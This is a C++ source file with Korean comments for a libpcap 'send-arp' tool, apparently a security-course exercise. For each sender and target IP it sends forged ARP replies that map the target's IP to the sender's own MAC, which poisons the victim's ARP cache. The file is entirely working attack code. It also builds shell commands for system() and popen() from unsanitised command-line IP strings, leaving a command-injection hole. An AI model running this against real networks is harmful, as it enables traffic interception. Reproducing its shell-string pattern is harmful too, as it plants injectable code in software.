#include <pcap.h> // pcap 패키지 사용을 위해 포함
#include <cstdlib> // system 함수 사용을 위해 포함
#include <unistd.h> // BUFSIZ 가져오기 위해 포함
#include <fstream> // 파일 입출력을 위해 포함
#include <memory> // unique_ptr 사용을 위해 포함
#include <iostream> // printf 사용을 위해 포함
#include <array> // array 사용을 위해 포함
#include "ethhdr.h" // 이더넷 헤더 구조체 가져오기 위해 포함
#include "arphdr.h" // ARP 헤더 구조체 가져오기 위해 포함

using namespace std; // 이름 공간 사용

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_; // 이더넷 헤더
    ArpHdr arp_; // ARP 헤더
};
#pragma pack(pop)

void usage() { // 사용 방법 출력 함수
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n"); // 사용 방법 설명
    printf("sample: send-arp enp0s3 127.0.0.1 127.0.0.2\n"); // 사용 예시
}

string get_sender_mac(char* sender_ip) { // 발신자의 MAC 주소 얻어오기
    string cmd_ping = "ping " + string(sender_ip) + " -c 1"; // ping 명령
    system(cmd_ping.c_str()); // ping 실행

    string cmd_get_mac = "cat /proc/net/arp | grep " + string(sender_ip) + " | awk '{print $4}'"; // arp 테이블에서 MAC 주소 얻기
    array<char, 128> buffer; // 결과 버퍼
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd_get_mac.c_str(), "r"), pclose); // 실행 및 파일 포인터 가져오기

    fgets(buffer.data(), buffer.size(), pipe.get()); // 결과 읽기
    return buffer.data(); // 결과 반환
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc & 1) { // 인자 확인
        usage(); // 사용 방법 출력
        return -1;
    }

    char* dev = argv[1]; // 인터페이스명
    string dev_str = string(dev); // 스트링으로 변환
    char errbuf[PCAP_ERRBUF_SIZE]; // 에러 메시지 버퍼
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // pcap 핸들 생성

    ifstream iface("/sys/class/net/" + dev_str + "/address"); // 인터페이스의 MAC 주소 파일 접근
    string mac_temp((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>()); // 파일 내용 읽기
    string my_mac(mac_temp.begin(), mac_temp.end() - 1); // 끝에 개행문자 제거

    int n = (argc - 2) / 2; // 쌍의 수 계산 (인자는 2개씩 사용)

    for (int i = 1; i < n + 1; i++) {

        EthArpPacket packet; // 이더넷 ARP 패킷 구조체
        char* sender_ip, * target_ip;
        sender_ip = argv[2 * i]; // 발신자 IP 얻기
        target_ip = argv[2 * i + 1]; // 목적지 IP 얻기

        string sender_mac = get_sender_mac(sender_ip); // 발신자 MAC 주소 얻기

        packet.eth_.dmac_ = Mac(sender_mac.c_str()); // 목적 MAC 설정
        packet.eth_.smac_ = Mac(my_mac.c_str()); // 소스 MAC 설정
        packet.eth_.type_ = htons(EthHdr::Arp); // 이더넷 타입: ARP

        packet.arp_.hrd_ = htons(ArpHdr::ETHER); // ARP 하드웨어 타입: 이더넷
        packet.arp_.pro_ = htons(EthHdr::Ip4); // 프로토콜 타입: IPv4
        packet.arp_.hln_ = Mac::SIZE; // 하드웨어 주소 길이
        packet.arp_.pln_ = Ip::SIZE; // 프로토콜 주소 길이
        packet.arp_.op_ = htons(ArpHdr::Reply); // ARP 연산: 응답
        packet.arp_.smac_ = Mac(my_mac.c_str()); // 소스 MAC 주소 설정
        packet.arp_.sip_ = htonl(Ip(target_ip)); // 소스 IP 주소 설정
        packet.arp_.tmac_ = Mac(sender_mac.c_str()); // 목적지 MAC 주소 설정
        packet.arp_.tip_ = htonl(Ip(sender_ip)); // 목적지 IP 주소 설정

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); // 패킷 전송

        if (res != 0) { // 오류 확인
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle); // pcap 핸들 닫기
}

